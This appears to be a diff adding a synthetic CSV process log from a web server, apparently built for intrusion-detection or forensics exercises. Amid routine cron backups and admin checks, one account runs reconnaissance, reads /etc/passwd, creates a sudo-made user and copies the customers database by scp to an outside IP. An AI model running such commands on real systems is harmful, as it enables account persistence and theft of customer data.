@@ -1,0 +1,16 @@
+Timestamp,Host,Account,PID,Process,CommandLine
+Oct 20 00:00:02,web-01,root,9004,cron,/usr/local/bin/backup.sh --db customers
+Oct 20 02:00:02,web-01,root,30332,cron,/usr/local/bin/backup.sh --db customers
+Oct 20 02:17:08,web-01,jsmith,4226,whoami,whoami
+Oct 20 02:18:11,web-01,jsmith,30240,id,id
+Oct 20 02:18:46,web-01,jsmith,15230,cat,cat /etc/passwd
+Oct 20 02:19:13,web-01,jsmith,31172,ls,ls -la /var/backups
+Oct 20 02:20:09,web-01,jsmith,10067,sudo,sudo useradd -m -s /bin/bash backup_svc
+Oct 20 02:21:06,web-01,jsmith,21481,crontab,crontab -l
+Oct 20 02:21:28,web-01,jsmith,22295,scp,scp /var/backups/customers.sql backup@203.0.113.45:/tmp/
+Oct 20 04:00:02,web-01,root,15141,cron,/usr/local/bin/backup.sh --db customers
+Oct 20 06:00:02,web-01,root,31571,cron,/usr/local/bin/backup.sh --db customers
+Oct 20 08:00:02,web-01,root,3921,cron,/usr/local/bin/backup.sh --db customers
+Oct 20 08:45:51,web-01,alice,14418,systemctl,systemctl status nginx
+Oct 20 08:46:21,web-01,alice,14793,tail,tail -n 50 /var/log/nginx/error.log
+Oct 20 08:47:24,web-01,alice,27692,git,git -C /srv/portal pull
